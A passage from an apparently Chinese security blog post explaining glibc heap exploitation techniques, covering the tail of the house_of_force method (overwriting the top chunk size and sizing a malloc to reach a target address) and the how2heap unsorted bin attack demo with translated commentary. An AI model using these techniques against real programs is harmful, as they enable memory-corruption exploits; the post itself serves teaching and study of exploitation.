现在heap区域就存在了两个chunk一个是p1,一个是top chunk。

p1的真实大小应该是 0x100 + 0x8

现在模拟一个漏洞，改写top chunk的头部，top chunk的起始地址为：

    
    
    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);

用一个很大的值来改写top chunk的size，以免等一下申请内存的时候使用 **mmap** 来分配：

    
    
    ptr_top[0] = -1;

改写之后top chunk的size=0xFFFFFFFF。

现在top chunk变得非常大，我们可以malloc一个在此范围内的任何大小的内存而不用调用mmap。

接下来malloc一个chunk，使得这个chunk刚好分配到我们想控制的那块区域为止，然后我们就可以malloc出我们想控制的区域了。

比如：我们想要改写的变量位置在0x602060，top chunk 的位置在0x127b528，再算上head的大小，我们将要malloc
0xffffffffff386b28 个字节。

新申请的这个chunk开始于原来top chunk所处的位置。

而此时top chunk已经处在0x602050了，之后再malloc就会返回一个包含我们想要改写的变量的chunk了。

这个例程和它的名字一样暴力，直接对top chunk下手，想法很大胆的一种攻击方式。

首先是修改top chunk的size字段为-1（在x64机器上实际大小就为0xFFFFFFFF）

然后malloc一个很大的值 **Large** ，L的计算就是用你想控制的地址的值 **Ctrl** 减去top地址的值 **Top** ，那么Large
= Ctrl – Top 。

    
    
    malloc(Large);

用malloc申请了这个chunk之后top chunk是这样的：

这个技巧的利用效果就是，我们可以用malloc返回一个heap区域之前的地址。

**0x09 unsorted_bin_attack**

****

源码：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    int main(){
        printf("This file demonstrates unsorted bin attack by write a large unsigned long value into stackn");
        printf("In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
               "global variable global_max_fast in libc for further fastbin attacknn");
        unsigned long stack_var=0;
        printf("Let's first look at the target we want to rewrite on stack:n");
        printf("%p: %ldnn", &stack_var, stack_var);
        unsigned long *p=malloc(400);
        printf("Now, we allocate first normal chunk on the heap at: %pn",p);
        printf("And allocate another normal chunk in order to avoid consolidating the top chunk with"
               "the first one during the free()nn");
        malloc(500);
        free(p);
        printf("We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
               "point to %pn",(void*)p[1]);
        //------------VULNERABILITY-----------        p[1]=(unsigned long)(&stack_var-2);
        printf("Now emulating a vulnerability that can overwrite the victim->bk pointern");
        printf("And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn",(void*)p[1]);
        //------------------------------------        malloc(400);
        printf("Let's malloc again to get the chunk we just free. During this time, target should has already been "
               "rewrite:n");
        printf("%p: %pn", &stack_var, (void*)stack_var);
    }

**翻译：**

这个例程通过unsortedbin攻击往栈中写入一个unsigned long的值。

在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。

比如，我们在栈上有一个栈单元stack_var需要被改写

    
    
    unsigned long stack_var=0;

然后正常地分配一个chunk。

    
    
    unsigned long *p=malloc(400);

再分配一个，防止前一个chunk在free的时候被合并了。

    
    
    malloc(500);

然后

    
    
    free(p);

之后p会被插入到unsortedbin链表中，而且它的fd和bk都指向unsortedbin的head。

接着我们模拟一个漏洞攻击改写p的bk指针：

    
    
    p[1]=(unsigned long)(&stack_var-2);

然后用malloc出发unsortedbin的unlink：

    
    
    malloc(400);

然后 **stack_var** 的值就被改写成了unsortedbin的head的地址了。

这也算是unlink的另一种用法，上一篇的总结中， **unsafe_unlink**
通过unlink来直接控制地址，这里则是通过unlink来泄漏libc的信息，来进行进一步的攻击。流程也较为简单。

和 **house_of_lore**
操作有点像，也是通过修改victim的bk字段，不过我们做这个的主要目的不是返回一个可控的地址，而是将libc的信息写到了我们可控的区域。

**0x0A 写在最后**

****

个人水平有限，加上总结的时候有一些不太重要的点被我选择性地忽略了，如果有疑问请在下面留言。

最后一个例程 **house_of_einherjar** 在新版glibc已经不能用了，所以不做介绍。

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **7o8v@SYC☘️** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86809](/post/id/86809)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __1赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t01a4a92bb6151ed710.jpg)
7o8v@SYC☘️

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

